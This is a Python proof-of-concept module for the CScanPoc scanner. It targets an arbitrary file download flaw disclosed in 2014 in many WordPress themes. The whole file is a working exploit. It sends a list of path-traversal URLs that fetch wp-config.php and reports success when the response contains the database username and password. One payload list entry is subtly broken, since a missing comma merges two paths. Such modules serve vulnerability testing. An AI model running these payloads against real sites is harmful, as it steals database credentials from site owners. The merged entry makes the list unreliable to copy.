# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0114' # 平台漏洞编号，留空
    name = 'WordPress Multiple themes /download.php Arbitrary File Download' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-12-29'  # 漏洞公布时间
    desc = '''
    "download_file" variable is not sanitized.
    ''' # 漏洞描述
    ref = 'http://packetstormsecurity.com/files/129706/wptheme-download.txt' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Multiple themes'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '54925c24-a18c-4042-abc0-208c14e20e40' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = [
                '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
                '/wp-content/force-download.php?file=../wp-config.php',
                '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php',
                '/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php',
                '/wp-content/themes/markant/download.php?file=../../wp-config.php',
                '/wp-content/themes/yakimabait/download.php?file=./wp-config.php',
                '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
                '/wp-content/themes/felis/download.php?file=../wp-config.php',
                '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
                '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php'
                '/wp-content/themes/epic/includes/download.php?file=wp-config.php',
                '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
                '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
                '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
                '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
                '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
                '/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php',
                '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
                '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
            ]
            file_path = []
            for filename in payload:
                verify_url = self.target + filename
                try:
                    req = urllib2.Request(verify_url)
                    content = urllib2.urlopen(req).read()
                except:
                    continue
                if 'DB_PASSWORD' in content and 'DB_USER' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                    file_path.append(verify_url)
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()